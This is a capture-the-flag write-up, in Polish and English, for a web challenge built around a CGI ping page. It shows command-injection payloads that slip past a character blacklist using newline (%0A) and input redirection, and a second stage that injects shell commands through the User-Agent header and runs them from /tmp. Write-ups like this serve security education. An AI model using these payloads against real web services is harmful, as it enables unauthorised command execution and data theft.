##smartcat (Web, 50+50p)

###PL
[ENG](#eng-version)

W zadaniu dostajemy do dyspozycji webowy interfejs (CGI) pozwalający pignować wskazanego hosta. 
Domyślamy się, że pod spodem operacja jest realizowana jako wywołanie `ping` w shellu z doklejonym podanym przez nas adresem.

#### Smartcat1

Pierwsza część zadania polega na odczytaniu flagi znajdującej się w nieznanym pliku, więc wymaga od nas jedynie możliwości czytania plików.
Operatory:

	$;&|({` \t 

są zablokowane, ale zauważamy, że znak nowej linii `\n` jest wyjątkiem.
Możemy dzięki temu wykonać dowolną komendę podając na wejściu np.

`localhost%0Als`

Co zostanie potraktowane jako 2 osobne komendy - `ping localhost` oraz `ls`

Wywołanie `ls` pozwala stwierdzić, że w bierzącym katalogu jest katalog `there`, ale nie mamy możliwości listować go bez użycia spacji. Po chwili namysłu wpadliśmy na pomysł żeby użyć programu `find` który dał nam:

```
.
./index.cgi
./there
./there/is
./there/is/your
./there/is/your/flag
./there/is/your/flag/or
./there/is/your/flag/or/maybe
./there/is/your/flag/or/maybe/not
./there/is/your/flag/or/maybe/not/what
./there/is/your/flag/or/maybe/not/what/do
./there/is/your/flag/or/maybe/not/what/do/you
./there/is/your/flag/or/maybe/not/what/do/you/think
./there/is/your/flag/or/maybe/not/what/do/you/think/really
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag
```

Pozostało nam tylko wywołać `cat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag` i uzyskać flagę:

`INS{warm_kitty_smelly_kitty_flush_flush_flush}`

#### Smartcat2

Druga część zadania jest trudniejsza, ponieważ treść sugeruje, że musimy odczytać flagę przez coś znajdującego się w katalogu `/home/smartcat/` oraz, że potrzebny będzie do tego shell.
Zauważamy po pewnym czasie, że możemy tworzyć pliki w katalogu `/tmp`. 
Możemy także uruchamiać skrypty shell przez `sh<script.sh`, ale nadal mieliśmy problem z tym, jak umieścić w skrypcie interesującą nas zawartość.
Wreszcie wpadliśmy na to, że istnieją pewne zmienne, na których zawartość możemy wpłynąć - nagłówki http.
W szczególności możemy w dowolny sposób ustawić swój `user-agent`. 
Następnie możemy zawartość zmiennych środowiskowych wypisać przez `env` a wynik tej operacji zrzucić do pliku w `tmp`, a potem uruchomić przez `sh</tmp/ourfile`.

Pierwsza próba zawierająca user-agent: `a; echo "koty" >/tmp/msm123; a` zakończyła się sukcesem. 

Mogliśmy więc z powodzeniem wykonać dowolny kod, w tym użyć `nc` lub `pythona` do postawienia reverse-shell. Zamiast tego najpierw wylistowaliśmy katalog `/home/smartcat/` znajdując tam program `readflag`, który przed podaniem flagi wymagał uruchomienia, odczekania kilku sekund i przesłania komunikatu.
Wysłaliśmy więc na serwer skrypt, który wykonywał właśnie te czynności z podanym programem i dostaliśmy:

	Flag:
				___
			.-"; ! ;"-.
		  .'!  : | :  !`.
		 /\  ! : ! : !  /\
		/\ |  ! :|: !  | /\
	   (  \ \ ; :!: ; / /  )
	  ( `. \ | !:|:! | / .' )
	  (`. \ \ \!:|:!/ / / .')
	   \ `.`.\ |!|! |/,'.' /
		`._`.\\\!!!// .'_.'
		   `.`.\\|//.'.'
			|`._`n'_.'|  hjw
			"----^----"

`INS{shells_are _way_better_than_cats}`

###ENG version

In the task we get a web interface (CGI) for pinging selected host.
We predict that underneath this is calling `ping` from shell with adress we give.

#### Smartcat1-eng

First part of the task requires reading a flag residing in an unknown file, so we only need to be able to read files.
In the web interface characters 
	
	$;&|({` \t

are blocked, but we notice that newline character `\n` or `%0A` is an exception.
Thanks to that we can execute any command we want by using input:

`localhost%0Als`

This will be executed as 2 separate commands - `ping localhost` and `ls`

Calling `ls` shows us that in currend directory there is a `there` directory, but we can't list it since we can't use space. After a while we figure that we could use `find` which gived us:

	.
	./index.cgi
	./there
	./there/is
	./there/is/your
	./there/is/your/flag
	./there/is/your/flag/or
	./there/is/your/flag/or/maybe
	./there/is/your/flag/or/maybe/not
	./there/is/your/flag/or/maybe/not/what
	./there/is/your/flag/or/maybe/not/what/do
	./there/is/your/flag/or/maybe/not/what/do/you
	./there/is/your/flag/or/maybe/not/what/do/you/think
	./there/is/your/flag/or/maybe/not/what/do/you/think/really
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the
	./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag


We call: `cat<./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag` and get flag:

`INS{warm_kitty_smelly_kitty_flush_flush_flush}`

#### Smartcat2-eng

Second part is more difficult, since we task suggests we need to get the flag using something in `/home/smartcat/` dir and that we will need a shell for that.
After some work we notice that we can create files in `/tmp`.
We can also call shellscripts by `sh<scrupt.sh`, but we still didn't know how to place data we want inside the file.
Finally we figured that there are some environmental variables that we can set - http headers.
In particular we can set `user-agent` to any value we want.
We can then list those variables by `env` and save result of this operation to a file in `/tmp` and then run with `sh</tmp/ourfile`.

First attempt containing: `a; echo "koty" >/tmp/msm123; a` was successful.

Therefore, we could execute any code, including using `nc` or `python` to set a reverse-shell. Instead we started with listing `/home/smartcat/` directory, finding `readflag` binary, which requires us to execute it, wait few seconds and then send some message to get the flag.
Instead of the shell we simply sent a script which was doing exactly what `readflag` wanted and we got:

	Flag:
				___
			.-"; ! ;"-.
		  .'!  : | :  !`.
		 /\  ! : ! : !  /\
		/\ |  ! :|: !  | /\
	   (  \ \ ; :!: ; / /  )
	  ( `. \ | !:|:! | / .' )
	  (`. \ \ \!:|:!/ / / .')
	   \ `.`.\ |!|! |/,'.' /
		`._`.\\\!!!// .'_.'
		   `.`.\\|//.'.'
			|`._`n'_.'|  hjw
			"----^----"

`INS{shells_are _way_better_than_cats}`
